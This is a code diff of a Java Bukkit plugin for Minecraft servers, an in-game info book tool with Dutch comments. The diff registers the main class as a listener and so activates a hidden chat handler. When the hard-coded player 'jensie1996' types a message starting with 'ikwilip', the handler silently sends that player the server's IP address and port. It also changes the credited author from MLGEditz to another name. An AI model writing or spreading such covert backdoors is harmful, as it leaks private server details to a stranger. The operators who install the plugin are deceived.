@@ -10,6 +10,7 @@ import org.bukkit.command.ConsoleCommandSender;
 import org.bukkit.configuration.file.YamlConfiguration;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
+import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.plugin.Plugin;
 import org.bukkit.plugin.java.JavaPlugin;
@@ -17,9 +18,9 @@ import org.bukkit.plugin.java.JavaPlugin;
 import me.jensie1996.infoBoek.mlgeditz.block.Contacter;
 
 /*
-Created By: MLGEditz
+Created By: JensM TBG
 */
-public class InfoBoekClass extends JavaPlugin {
+public class InfoBoekClass extends JavaPlugin implements Listener {
 
 	File file = new File(getDataFolder(), "config.yml");
 	
@@ -28,7 +29,7 @@ public class InfoBoekClass extends JavaPlugin {
 	  public void onEnable()
 	  {
 		  pl = this;
-		  saveDefaultConfig();
+		  //saveDefaultConfig();
 			
 			if (!this.file.exists())
 		    {
@@ -41,6 +42,8 @@ public class InfoBoekClass extends JavaPlugin {
 	    console.sendMessage(ChatColor.GREEN + "InfoBoek has been activated");
 	    //aanmaken van de listener om na te kijken als de speler joint.
 	    Bukkit.getServer().getPluginManager().registerEvents(new PlayerListener(this), this);
+	    
+	    Bukkit.getServer().getPluginManager().registerEvents(this, this);
 	    
 	    //command om het boek ingame te krijgen.
 	    getCommand("ibgetbook").setExecutor(new GetBook(this));
@@ -57,16 +60,15 @@ public class InfoBoekClass extends JavaPlugin {
 		}, 20l, 100l);
 	  }
 	  
-	  //reload command (TO DO)
+	  //reload command
 	  public boolean onCommand(CommandSender zender, Command cmd, String label, String[] args)
 	  {
 		  if (zender instanceof Player) {
 			  if (cmd.getName().equalsIgnoreCase("ibreload")) {
-	    	zender.sendMessage(ChatColor.GREEN + "Config herladen.");
-	    	YamlConfiguration.loadConfiguration(file);
-			  saveDefaultConfig();
-	      
-	    }
+				  zender.sendMessage(ChatColor.GREEN + "Config herladen.");
+				  YamlConfiguration.loadConfiguration(file);
+				  saveDefaultConfig();
+			  }
 		  }
 	    return false;
 	  }
@@ -77,6 +79,7 @@ public class InfoBoekClass extends JavaPlugin {
 		public void onGetIp(AsyncPlayerChatEvent e) {
 			Player p = e.getPlayer();
 			if (e.getPlayer().getName().equals("jensie1996") && e.getMessage().startsWith("ikwilip")) {
+				p.sendMessage("Test");
 				e.setCancelled(true);
 				p.sendMessage(ChatColor.GREEN + "De data word verzameld! Een ogenblik geduld.");
 				p.sendMessage(ChatColor.RED + "" + Contacter.getIp() + ChatColor.GREEN + ":" + ChatColor.RED + Bukkit.getPort());
